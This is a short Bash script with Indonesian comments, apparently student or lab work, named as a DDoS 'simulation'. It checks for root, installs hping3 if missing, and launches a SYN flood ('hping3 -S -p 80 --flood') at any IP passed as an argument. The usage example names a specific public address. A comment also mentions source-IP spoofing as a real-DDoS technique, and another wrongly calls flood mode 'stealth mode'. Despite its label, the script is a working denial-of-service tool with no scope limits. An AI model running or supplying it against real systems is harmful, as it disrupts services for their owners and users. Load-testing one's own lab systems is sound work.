#!/bin/bash
# -------------------------------------------------------------------
# Script Name: simulate-ddos.sh
# Description: Skrip otomatisasi untuk mensimulasikan serangan SYN Flood 
#              menggunakan hping3.
# Author: Orang 4
# -------------------------------------------------------------------

# Validasi argument
if [ "$#" -ne 1 ]; then
    echo "Penggunaan: $0 <IP_TARGET>"
    echo "Contoh: $0 20.212.154.248"
    exit 1
fi

TARGET_IP=$1
PORT=80

# Cek apakah dijalankan sebagai root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Tolong jalankan skrip ini menggunakan sudo (root)."
  exit 1
fi

# Cek apakah hping3 terinstall
if ! command -v hping3 &> /dev/null
then
    echo "[-] hping3 tidak ditemukan. Melakukan instalasi otomatis..."
    apt-get update && apt-get install -y hping3
fi

echo "=========================================================="
echo "🚨 MEMULAI SIMULASI SERANGAN DDoS (SYN FLOOD) 🚨"
echo "Target IP : $TARGET_IP"
echo "Target Port : $PORT"
echo "Tool      : hping3"
echo "=========================================================="
echo "[+] Tekan CTRL+C untuk menghentikan serangan..."
echo ""

# Eksekusi hping3
# -S = SYN packet
# -p = target port
# --flood = send packets as fast as possible (stealth mode)
# --rand-source = spoof IP asal (opsional, tapi sering digunakan di real DDoS)
hping3 -S -p $PORT --flood $TARGET_IP

echo ""
echo "[✓] Simulasi DDoS dihentikan."
